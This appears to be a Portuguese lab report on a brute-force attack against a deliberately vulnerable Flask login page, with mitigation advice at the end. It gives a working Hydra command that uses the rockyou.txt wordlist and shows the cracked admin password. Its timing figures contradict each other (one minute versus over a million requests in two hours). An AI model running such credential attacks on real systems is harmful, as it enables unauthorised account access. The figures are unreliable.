# ?? Relat�rio de Ataque de For�a Bruta com RockYou - Kali Linux

**Ferramenta utilizada:** Hydra  
**Alvo:** Servidor Flask vulner�vel  
**IP do alvo:** `192.168.x.x` (substitua pelo IP real)  
**Porta:** `5000`  
**Wordlist:** `rockyou.txt`  

## ?? Passo a Passo Executado

### 1. Prepara��o do Ambiente
- **Sistema:** Kali Linux 2023.4  
- **Wordlist:**  
  ```bash
  # Descompactei o rockyou.txt (se necess�rio)
  sudo gunzip /usr/share/wordlists/rockyou.txt.gz

Comando Hydra Executado
bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.x.x http-post-form "/:username=^USER^&password=^PASS^:Login falhou" -V -t 4
 
Resultados Obtidos
Senha quebrada: admin: 123456 

Tempo de ataque: 1 minuto

Fator,	Risco,	Explica��o:

Senha comum,	Cr�tico,	Presente no top 0.1% do rockyou.txt
Sem rate limiting,	Alto,	Servidor permitiu >1M requisi��es em 2 horas
Protocolo HTTP,	M�dio,	Credenciais trafegadas em texto claro

?? Recomenda��es de Mitiga��o
Bloqueio progressivo ap�s 5 tentativas falhas

Trocar para HTTPS com certificado SSL

Monitorar logs para detectar padr�es de ataque

Implementar 2FA para contas privilegiadas

?? O rockyou.txt cont�m 14 milh�es de senhas reais vazadas. Senhas como "senha123" s�o encontradas rapidamente.